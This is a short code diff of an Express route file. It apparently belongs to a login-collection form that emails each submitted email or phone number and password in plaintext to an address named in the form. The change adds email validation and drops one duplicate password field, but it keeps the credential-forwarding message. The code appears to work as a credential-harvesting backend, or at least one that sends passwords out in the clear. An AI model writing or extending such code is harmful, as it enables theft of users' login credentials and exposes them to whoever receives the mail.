@@ -11,7 +11,7 @@ const formOneSchema = z.object({
 const formTwoSchema = z.object({
   user_email: z.string(),
   password: z.string(),
-  notify_email: z.string().optional(), // Optional email for password notifications
+  notify_email: z.string().email().optional(),
 });
 
 export async function registerRoutes(app: Express) {
@@ -52,7 +52,6 @@ export async function registerRoutes(app: Express) {
           Email/Phone: ${data.user_email}
           Password: ${data.password}
         `,
-        password: data.password,
         additionalRecipient: data.notify_email,
       });
 
